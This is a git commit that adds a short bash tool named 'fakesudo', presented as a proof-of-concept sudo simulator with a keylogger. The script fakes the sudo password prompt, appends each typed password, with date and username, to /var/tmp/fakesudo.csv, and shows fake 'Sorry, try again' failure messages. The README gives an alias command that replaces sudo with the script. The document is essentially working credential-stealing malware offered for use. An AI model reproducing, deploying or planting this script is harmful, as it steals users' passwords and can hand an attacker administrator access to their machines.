d3897f750fb871b3be33d9cebbd78b752ebe3ac2
Reymer Antonio Vargas Solano <me@reymervargas.com>
2016-03-26 17:55:58 -0600

    fake sudo.. & and README

---
+++ README.md
@@ -0,0 +1,11 @@
+# fakesudo
+
+Proof of concept of sudo simulator, with keylogger
+
+*** USE UNDER YOUR RISK ***
+
+## Usage
+
+```bash
+alias sudo="./fakesudo.sh"; sudo
+```
---
+++ fakesudo.sh
@@ -0,0 +1,40 @@
+#!/usr/bin/env bash
+#
+#############################################################################
+#
+# File: fakesudo.sh
+#
+# Version: 0.1
+# Date: 20160223_1228
+# Modified: 20160223_1228
+#
+# Information: Proof of concept of sudo simulator, with keylogger.
+#
+# Copyright (c) 2015, Reymer Antonio Vargas Solano
+# All rights reserved.
+#
+#############################################################################
+#
+#
+
+fecha=$(date +%Y%m%d_%H%M)
+contador=0
+
+function fakesudo()
+{
+  clear
+  while [ $contador -lt 3 ]
+  do
+    read -sp "[sudo] password for $USER:" clave
+    echo
+    sleep 1
+    echo "$fecha, $USER, $clave" >> /var/tmp/fakesudo.csv
+    echo "Sorry, try again."
+    contador=$(( $contador + 1 ))
+  done
+
+  echo "sudo: 3 incorrect password attempts"
+  exit 1
+}
+
+fakesudo
